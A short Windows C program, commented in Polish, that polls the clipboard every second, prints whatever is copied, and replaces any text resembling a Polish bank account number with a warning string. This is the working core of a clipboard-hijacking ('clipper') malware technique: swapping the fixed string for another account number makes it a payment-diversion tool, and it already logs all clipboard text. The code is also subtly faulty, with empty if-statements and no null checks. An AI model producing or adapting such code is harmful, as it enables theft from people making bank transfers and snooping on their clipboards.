#include <windows.h>
#include <stdio.h>
#include <string.h>

int main()
{
    while(1) {
        if (!OpenClipboard(NULL));

        HANDLE hData = GetClipboardData(CF_TEXT);//pobranie zawartosci schowka do uchwytu jakiegos

        char *intercept_text = (char *) GlobalLock(hData); //cast locka zablokowanej pamieci na heapie na char pointer
        printf("Original clipboard data: %s\n", intercept_text);

        if (strlen(intercept_text) == 28 && strspn(intercept_text, "PL0123456789") == 28) {
            printf("detected\n");

            const char *newClipboardData = "DON'T PASTE!!!!!!"; //nowy tekst jak wykryje numer konta
            size_t len = strlen(newClipboardData) + 1;
            HANDLE hNewData = GlobalAlloc(GMEM_MOVEABLE, len);//alokowanie pamieci o dlugosci len na globalnym heapie
            char *new_string_pointer = (char *) GlobalLock(hNewData); //cast locka na char pointer
            strcpy(new_string_pointer, newClipboardData);//skopiowanie nowego tekstu pod adres globalnego locka

            EmptyClipboard();//trzeba wyczyscic przed nadpisaniem, bo clipboard moze miec tylko jedna wartos tego samego typu

            if (SetClipboardData(CF_TEXT, hNewData) == NULL);
            GlobalUnlock(hNewData);//zwolnienie pamieci zaalokowanej na przekazanie tekstu do clipboard
        } else {
            printf("not detected\n");
        }

        GlobalUnlock(hData);
        CloseClipboard();
        Sleep(1000);
    }
}
